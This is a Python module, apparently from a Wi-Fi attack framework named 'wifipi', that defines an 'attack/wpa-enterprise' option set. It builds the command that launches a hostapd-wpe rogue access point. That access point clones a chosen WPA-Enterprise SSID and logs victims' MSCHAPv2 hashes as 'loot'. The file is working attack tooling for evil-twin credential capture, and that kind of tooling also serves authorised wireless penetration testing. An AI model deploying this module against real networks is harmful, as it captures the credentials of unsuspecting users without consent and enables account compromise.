"""attack/wpa-enterprise — hostapd-wpe RADIUS impersonation for MSCHAPv2 capture."""

from __future__ import annotations

from wifipi.module import Module
from wifipi.options import OptionSpec


class WpaEnterprise(Module):
    NAME = "attack/wpa-enterprise"
    CATEGORY = "attack"
    DESCRIPTION = "Clone a WPA-Enterprise SSID via hostapd-wpe; logs MSCHAPv2 hashes."
    OPTIONS = {
        "SSID":    OptionSpec(required=True,
                              description="Enterprise SSID to clone."),
        "CHANNEL": OptionSpec(required=False, default="6",
                              description="AP channel.", kind="int"),
    }
    REQUIRES_TOOLS = ["hostapd-wpe"]
    BLOCKING = False
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "attacks"

    def build_argv(self, opts: dict) -> list[str]:
        ap = opts.get("AP_IFACE")
        if not ap:
            raise RuntimeError("AP_IFACE not set — need a rogue-AP adapter")
        return [
            "python3", "-m", "wifipi.modules.attack._wpa_ent_runner",
            "--workdir", opts.get("_WORKDIR", "/tmp/wpa-ent"),
            "--ap-iface", ap,
            "--ssid", opts["SSID"],
            "--channel", str(opts.get("CHANNEL", "6")),
        ]
